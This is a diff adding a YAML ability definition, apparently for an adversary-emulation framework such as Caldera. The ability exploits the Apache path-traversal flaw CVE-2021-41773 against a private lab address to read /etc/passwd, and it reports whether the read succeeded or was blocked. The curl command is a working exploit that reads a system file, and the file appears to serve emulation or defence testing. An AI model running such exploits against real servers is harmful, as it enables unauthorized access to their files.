@@ -1,0 +1,32 @@
+- tactic: collection
+  technique_name: Exploit Public-Facing Application
+  technique_id: T1190
+  name: Path traversal read passwd WEB-01
+  description: Explota CVE-2021-41773 para leer /etc/passwd mediante path traversal
+  executors:
+  - name: sh
+    platform: linux
+    command: resultado=$(curl -s --path-as-is "http://192.168.56.105/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd");
+      echo "$resultado" | grep -q "root:" && echo "$resultado" && echo "LECTURA OK"
+      || (echo "LECTURA BLOQUEADA" && exit 1)
+    code: null
+    language: null
+    build_target: null
+    payloads: []
+    uploads: []
+    timeout: 60
+    parsers: []
+    cleanup: []
+    variations: []
+    additional_info: {}
+  requirements: []
+  privilege: ''
+  repeatable: false
+  buckets:
+  - collection
+  additional_info: {}
+  access: {}
+  singleton: false
+  plugin: ''
+  delete_payload: true
+  id: a5d9036f-e21e-4789-94d3-3f4d65e085dd
